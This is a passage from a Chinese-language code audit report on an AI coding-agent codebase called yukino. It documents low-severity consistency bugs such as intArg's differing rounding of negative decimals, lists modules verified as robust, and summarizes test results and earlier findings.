- 修复建议：历史召回/回退分支改为 `setCursorLine(entryLines.length - 1); setCursorCol(entryLines[entryLines.length - 1].length);`，与 `onRecallQueuedMessage` 对齐。

### P30【极低危｜卫生/一致性】`intArg` 对 number 用 `Math.floor`、对 string 用 `parseInt`，负小数下二者结果不同（已实测）

- 位置：`src/utils/index.ts` `intArg()`（:139-153）——`typeof v === "number"` 分支返回 `Math.floor(v)`（向 −∞ 取整）；`typeof v === "string"` 分支返回 `Number.parseInt(v, 10)`（向 0 截断）。
- 实测（本轮复现）：

  | 调用                           | 结果                 |
  | ------------------------------ | -------------------- |
  | `intArg({x: 1.9}, "x", 0)`     | `1`                  |
  | `intArg({x: "1.9"}, "x", 0)`   | `1`（正数下一致）    |
  | `intArg({x: -1.9}, "x", 0)`    | **`-2`**（floor）    |
  | `intArg({x: "-1.9"}, "x", 0)`  | **`-1`**（parseInt） |
  | `intArg({x: -0.5}, "x", 99)`   | **`-1`**             |
  | `intArg({x: "-0.5"}, "x", 99)` | **`-0`**             |

- 影响：**当前无功能危害**。全部 5 个调用点（`read-file.ts` offset/limit、`bash.ts`/`powershell.ts` timeout、`tool-search.ts` max_results）都在取整后做了范围校验或钳制：offset 校验 `>= 0`、limit 校验 `>= 1`、timeout 校验 `Number.isFinite && > 0`、max_results 钳到 `[1,50]`。负值/0 一律被拒或被钳，取整方向的差异永远暴露不到下游。属**潜在不一致**：一旦未来新增一个允许负值、且同时接受 number 与 string 形态的调用点，同一逻辑值会因 JSON 类型不同而得到不同整数。
- 定性：**真实缺陷（极低危，卫生/一致性）**。与 AGENTS.md「积极消除不一致」的精神相符，应统一取整语义。
- 修复建议：两分支统一为同一取整函数（如都走 `Math.trunc` 或都走 `Math.floor`）；鉴于这些参数语义上均为「非负计数/秒数」，`Math.trunc` 更贴合「截断小数」的直觉，且与 `parseInt` 行为一致。

## 十三、本轮检查过且确认健壮的部分（新增抽样，供覆盖度参考）

- **remote/address**：`parseRemoteAddress` 对裸数字（`"9000"`→端口）、`[IPv6]:port`、`host:port:port`（拒绝）、`localhost:abc`（拒绝）的分支均正确；`allowEphemeral` 对端口 0 的门控与「各模式自带 defaultPort」设计自洽（仅 `":"` 注释不符，见 P28）。
- **remote/browser**：`use-chat` reducer 对 stream/thinking/tool 的合并、`trimChatItems` 裁剪时同步失效 `currentAssistantId/currentThinkingId`、`error`/`loop_complete` 统一 finalize（防光标残留续写）；`use-web-socket` 的 rAF 批量 flush、token 经 hash→sessionStorage→replaceState 收敛、hashchange 热切换 token 重连、dispose 全量清理（cancelAnimationFrame/clearTimeout/removeEventListener/close）；`markdown` 用 DOMPurify 白名单标签+属性、user 侧 html/escape 渲染器转义。
- **goal**：`GoalManager` 的 activeMs 锚点累加（persist/transition/endRun 三处一致）、budget_limited→takeBudgetSummary 单次闸门、blocked 连续 3 轮计数（同轮去重 + 相邻轮 same 判定）、MAX_GOAL_TURNS 续跑上限、`--budget` 正则 `\d+` + schema positive 双保险。
- **plan-file**：`isPlanInStorage` 用 `relative()` 分隔符无关判定（注释明确 Windows 反斜杠场景）、`createPlanPath` 用 `flag:"wx"` 防覆盖、getOrCreate 对越界 planPath 告警并重建。
- **tool-result**：`applyBudget` 按内容降序 spill、读回豁免（isSpillReadback 以路径段边界匹配防 `<spillDir>-extra` 误判）、writeSpill 的 `wx` + EEXIST 复用、spill 失败保留原文不重试（消息即将定稿入历史）。
- **conversation/pairing**：`ensureToolPairing` 结果组紧跟 assistant 轮、缺失结果在轮边界补 INTERRUPTED、孤儿/重复结果丢弃、空壳消息删除以保角色交替、补丁不回写历史（仅本次请求有效）。
- **utils**：`canonicalPath` 逐级 realpath 回退（ENOENT/ENOTDIR 累积 missing 段）、`isPathWithin` 用 relative 判定、`resolveToolPath` 的 `~`/`~/`/`~\` 展开、`plainTerminalText` 剥 ANSI + 控制字符（保留 \n\t）、`contentToText` 对 image/tool_reference/search_result/document 的纯文本降级（无 base64 泄漏）、`takeUtf8Prefix` 按码点迭代（不切代理对）。
- **config**：`validateProviders` 的必填/协议白名单/base_url 去重、`validateMcpServers` 的 command⊕url 互斥 + transport 约束、`.mcp.json` 逐条独立解析（一条坏不拖垮全部）+ 用户级重名优先（项目文件 less trusted，与 P16 的信任门禁缺失是两回事）、`provider-login` 的 0600 原子写 + base_url 作身份就地替换 + 去重旧名后缀策略。
- **commands**：`parse` 对含 `/` 的名字判为路径而非命令、`CommandRegistry.register` 重名抛错、`loader` 的 frontmatter 容错（解析失败保留 body）+ `$ARGUMENTS`/`$1`/`${@:2:3}` 替换 + 无占位符时追加 args、`usage-tracker` 的 zod 校验 + 指数衰减评分。
- **bootstrap**：`exit-cleanup` 的 Set 去重 + 逐个 delete 防重入 + 吞错、`tool-registry` 的 trackingMode（todos/tasks）分流 + skill 命令注册重名跳过、`sandbox` 的 allowWrite=[cwd,tmpdir]（与 P3/P4 一致）。
- **prompt**：`PromptBuilder.build` 用 Set 去重 section、`detectEnvironment` 的 git 探测 try/catch 降级、`buildSystemPrompt` 把项目相关内容留给 injectLongTermMemory（保 prompt-cache 前缀稳定）。
- **mcp**：`manager` 的 runExclusive 串行化（startup/retry/reload 不竞态）+ 仅连未连服务器 + 失败 client.disconnect、`instructions` 的增量宣告（added/removed delta）+ 以历史 marker 为准（/clear、/resume、compaction 后全量重发）、`tool-wrapper` 的 sanitizeSegment 跨语言一致 + 长度前缀防服务器名单纯下划线歧义。
- **memory**：`manager` 的 capEntrypoint 字节级换行回退 + 代理对边界回退、buildSystemReminder 行/字节双上限 + 超限告警、findRelevantMemories 的 selector 失败/未完成/abort 三路返回空、byKey 文件名冲突首个胜出、writeIndex 锁内 tmp+rename + 内容相同跳过；`memory-age` 的 freshness 文案；`written-paths` 仅认成功写入的 WriteFile/EditFile；`permissions` 的 MemoryPermissionChecker 先 canonicalPath 再 isPathWithin（与主 PermissionChecker 的 P14 原始路径匹配形成对照——此处是正确范式）。
- **skills**：`catalog` 的 realpath visited 防环 + 目录 mtime 快照热重载 + get() 惰性重读（重命名触发全量 reload、解析失败保留缓存）、`parseSkillFile` 的 `---` 独立行 frontmatter + BOM 剥离、`executor` 的 buildSkillPrompt/parseSkillPrompt 往返（escapeSkillXml + decode）、fork 的 parent-context 注入；`load-skill-tool` 的 fork/inline 分流 + forDelegatedAgent 降级。
- **teams**：`index` 的 spawnTeammate 主循环（runAgent→idle 通知→mailbox 轮询→续跑）、plan 审批状态机（自动批准 vs leader 审查、shutdown 中断、resumeAfterPlanReview 合并等待期消息）、stopOne 的 stopping promise 去重、pruneTerminatedMembers 上限 200、TeamManager 的 canonicalPath 项目隔离 + subscribeMode 同步 permissionMode + deleteAll 双遍（内存 + 磁盘残留）；`protocol` 的 requestId 关联 + SHUTDOWN_PREFIX 双形态识别；`team-file` 的 writeTeamFile 锁内合并（incoming 优先 + removedMembers 剔除）+ tmp+rename；`task-stop` 的 teammate⊕task_id 互斥 + 跨团队重名只在拥有该成员的团队内停。
- **subagent**：`spawn` 的 model/systemPromptOverride 决定是否新建 client、fork 复用调用方已过滤 registry、initialMessages 按 transcript 是否存在取尾 1 条、finally 中 stopAll（awaited，防孤儿）+ 非 fork 才 dispose registry；`tool-filter` 的 5 层过滤（MCP 豁免 2-3 层、planExit 例外、async 白名单、definition 黑/白名单）+ MAIN_AGENT_ONLY/SUBAGENT_EXTRA 集合 + registerScopedTool 的 borrowed/owned 区分；`agent-tool` 的 fork 嵌套双层检测（querySource + 历史 marker）、worktree 隔离的 forCwd 重定根（权限面，OS 沙箱面见 P4）、teammate 名冲突加后缀、background 的 controller.abort 级联。
- **review**：`comment-tool` 的 parseComments 容错（单对象/JSON 字符串/逐条丢弃）+ normalizeCommentPath（反斜杠/`..`/前导斜杠）+ CommentCollector 插入序load-bearing；`format` 的 escapeXmlAttr + confirmed 块截断；`form` 的 from⊕tocommit 互斥 + ref 单行/非前导 `-` 校验；`report` 的 severity 图标 + 按路径分组；`llm-call` 的 callOnce 内联指令（不重绑 system prompt）。
- **feedback**：`dedup` 的 issueFingerprint（小写 + 去非字母数字 + sha256）+ 批内去重 + 已提交去重、recordFiledIssues 锁内合并；`github` 的 detectChannel 三通道降级（gh→token→browser）、createGist/createIssue 的 gh 与 REST 双路、truncateEncoded 不切 %XX 与多字节 UTF-8（lead byte 回退）、openInBrowser 的 Windows URL 加引号 + detached + unref。
- **update/version-check**：VERSION_PATTERN 严格 semver（含 prerelease 数字标识符前导 0 拒绝）、isNewerVersion 的 core 逐段 BigInt 比较 + prerelease 规则（数字<字母、短者<长者）、getLatestVersion 的 dist-tag 白名单（encodeURIComponent 往返 + `.`/`..` 拒绝）+ 10s 超时 + AbortSignal.any。
- **vscode**：`lockfile` 的 detectIde（CLAUDE_CODE_SSE_PORT 优先 + workspace 唯一匹配兜底）+ 陈旧锁按 pid 存活过滤 + cwdInWorkspace 的 NFC 归一（macOS NFD 对照）；`ide-client` 的 connectToIde（inIdeTerminal 才轮询 30s、abort 全路径 close、client.onclose 不覆盖 SDK teardown、0-based→1-based 行号转换）。
- **a2a/acp conversion**：`a2a/conversion` 的 yukino data part 判别式 + messageText 拼接 + tool-result 8000 截断；`acp/conversion` 的 promptToText（binary/image/audio 拒绝）+ toolKind 映射 + historyNotifications 跳过 boundary/非 user-assistant + addUsage 的 cached 令牌独立累计；`acp/stdio` 的 console→stderr 重定向（防污染 JSON-RPC stdout）。
- **telemetry/instrumentation**：observeLlmStream 的 completionStartTime 首令牌锚点 + stream_end 才记 usage + finally 恒记 duration（outcome 区分 completed/error/incomplete）、observeToolExecution 的 isError→ERROR level、sessionHash 的 sha256 截断 16（不泄漏原始 sessionId）、llmMetadata 用 WeakMap（不阻止 client GC）。
- **llm**：`model-discovery` 的 modelListUrl（剥 chat/completions 等尾段 + anthropic 强制 /v1 + 拒内嵌凭据）+ 分页 after_id 游标环检测 + redirect:"error" + 5s 超时；`retry` 的 retryAfterDelay 双格式（秒/HTTP-date）+ MAX_DELAY 钳制 + waitForLlmRetry 的 abort 清理；`errors` 的 containsContextLengthError 跨协议消息匹配。
- **tools（本轮新增抽样）**：`read-file` 的 10MB 准入 + 50KB 输出 + 读后 re-stat 防中途变更 + 图片 magic-byte 嗅探；`glob` 的 follow:false（符号链接目录不下钻，防环）+ matchBase + mtime 降序；`grep` 的 toUnicodePattern（\w\b\d→property escape，类内仅 \w\d）+ u 模式失败回退 legacy + 25MB 文件跳过 + 8KB NUL 二进制嗅探 + 符号链接文件跟随/目录不跟随；`lsp` 的 session 按 [cwd,name] 键 + isClosed 重建 + queue 串行 + diagnostics 的 pending 协议（Math.min(2000,timeout) 为设计意图，见第三轮更正 S-3）；`web-fetch` 的 10MB 流式累计 + content-length 预检 + 二进制 content-type 拒绝 + 15min/50MB URL 缓存（插入序驱逐）；`ask-user` 的 1-4 问 / 2-4 选项 zod 校验；`exit-code-hints` 的 extractBaseCmd 取管道末段 + 变量赋值跳过 + 128+n 信号兜底；`registry` 的 owned/borrowed 区分 + dispose 的 allSettled + AggregateError + native/dispatch 可见性谓词统一（getAllSchemas/listVisibleToolNames 共用 isToolVisible）。
- **session/index**：JSONL 追加 + 跨进程锁、loadTranscript 逐行 safeParse（坏行跳过不崩）、rebuildFromSession 的 boundary 逐级回退（坏 boundary 向前找上一个有效）、truncateSessionLines 的 write-tmp-rename（P8 的 rewind-tmp 锁外清理竞态仍成立）、cleanExpiredSessions 的 30 天 mtime 闸门 + sweptSessionDirs 每进程每目录一次。
- **file-history/index**：nextSnapshotSeq 单调计数器（防剪枝后名字复用覆盖活备份）、baseline 三态（existing/absent/unavailable）、rewind 的 trackedAfterTarget 基线恢复 + 瞬态失败保留重试（unresolvedBaselines）+ 剪枝快照备份删除、loadUnlocked 的 trackedFiles 空时从最新快照重建、全程 withFileSyncLock + tmp+rename。
- **recover**：TERMINAL_GONE_CODES（EIO/EPIPE/ERR_STREAM_DESTROYED）→ exit 0（读作干净退出而非崩溃）、uncaughtException/unhandledRejection 的 record→logger.fatal→telemetry→runExitCleanups（同步先扫，防孤儿）→shutdownTelemetry→exit(1)、stdio error 事件先于 uncaughtException 拦截、exitRecorded/terminalGoneRecorded 幂等。
- **ui 渲染层**：`marked-terminal`/`markdown`/`syntax-highlight` 的 shiki 高亮器按 mode:bg 缓存（≥4 全清重建）+ 引擎共享、`streaming-markdown` 的 stableStreamingPrefix（<2048 或含未闭合链接则不提交）+ 尾块保留可编辑、`table-layout` 的 fitTableToWidth（最宽字素下限 + 逐列让宽）+ renderTable 多行单元格、`terminal-text` 的 grapheme 边界钳制 + expandTabs 制表位 + cursorWindow 居中、`terminal-output` 的 DEC2026 同步输出探测（env 白名单，不发 DECRQM）+ resize 微任务 flush + 增量帧 diff、`terminal-theme` 的 OSC11/997 解析 + COLORFGBG 回退 + 100ms 超时兜底 dark。
- **ui 对话框/布局**：`ask-user-dialog` 的 hideSubmit（单问单选直接提交）+ 数字键全选择语义 + otherMode 下 TextField 独占按键、`permission-dialog`/`plan-approval` 的 Esc 语义（deny / manual 中间态）、`rewind-dialog` 的两阶段（选检查点→选范围）、`session-selector`/`model-select` 的 Fuse 模糊 + getListWindowStart 窗口、`tool-display`/`tool-preview` 的按工具名预览行数上限（bash 取尾、grep/glob 取头）+ 宽字素单列降级、`footer` 的 rowBudget 1/2/3 自适应 + 令牌百分比配色、`use-terminal-layout` 的 useSyncExternalStore + WeakMap 单例 store + resize 订阅引用计数。
- **remote/server（本轮新增分支）**：handleWsMessage 全 case 的 zod safeParse 门禁、handleUserMessage 的 streaming 槽位**同步**抢占（ensureAgent 冷启动 I/O 前）、steering 历史记录去重（steeringHistoryRecorded）、leftover 重放（新 run 可能已起，steer 而非丢弃）、drainFollowUps 与 handleUserMessage 的互递归（streaming 门控防双处理）、permission/ask 回调的 5min 超时 + abort 监听 + 三路径互斥（timer/response/cancel 不双 resolve）、image_upload 的 32MB + magic-byte + 0600 + 名称消毒、applyModel/applyProviderSwitch 的 streaming 期拒绝 + 运行时切换不被保存失败回滚、applyPermissionMode 的 plan 进出 reminder、handleRewindAction 的 sessionLineCount 权威坐标 + messageIndex 兜底、teammate/wakeup 定时器 unref + 签名去重广播。

## 十四、本轮结论

| 编号 | 结论                                                           | 严重度 | 定性                                    | 与其他报告关系       |
| ---- | -------------------------------------------------------------- | ------ | --------------------------------------- | -------------------- |
| P28  | `parseRemoteAddress` 注释把 `":"` 列为合法空主机，实现却抛错   | 极低   | 真实缺陷（文档/行为不一致）             | **新发现**（已实测） |
| P29  | 历史召回对多行条目光标落首行尾，与排队消息召回（末行尾）不一致 | 极低   | 真实缺陷（交互一致性）                  | **新发现**           |
| P30  | `intArg` number 走 floor、string 走 parseInt，负小数结果不同   | 极低   | 真实缺陷（卫生/一致性，当前无功能危害） | **新发现**（已实测） |

本轮总评：yukino 是一个**防御性工程极其扎实**的代码库——原子写 + rename、跨进程文件锁、UTF-8/grapheme 安全截断、magic-byte 嗅探、timing-safe 比较、秘密 redaction、进程组 kill + 退出清理注册表、流式终态守卫、zod 全边界校验、WeakMap 防泄漏、串行化生命周期（MCP/文件变更队列/工作区变更队列）等模式贯穿始终，且 2410 个测试全绿。前三轮 P1–P27 已覆盖全部高/中危面（权限绕过、路径穿越、供应链、沙箱、worktree 接线、打包、崩溃放大器等）；本轮在剩余未精读模块中**仅发现 3 条极低危的一致性/文档类缺陷**，无新增功能性或安全性危害。这从侧面印证：该代码库的剩余缺陷密度已很低，后续修复重心应放在前三轮的 P1（多行命令绕过 deny）、P14（allow 短路沙箱 + 原始路径穿越）、P16（项目级 .mcp.json 无信任门禁）等高危项上。

本轮验证环境：macOS、Node v24.16.0、`pnpm typecheck` 通过、`pnpm test` 156 文件 / 2410 passed / 1 skipped（65.67s）。P28/P30 标注「实测」的数据均在本机以 tsx 直跑对应源函数复现；验证脚本与临时目录（`.tmp-explore/`）已清理。
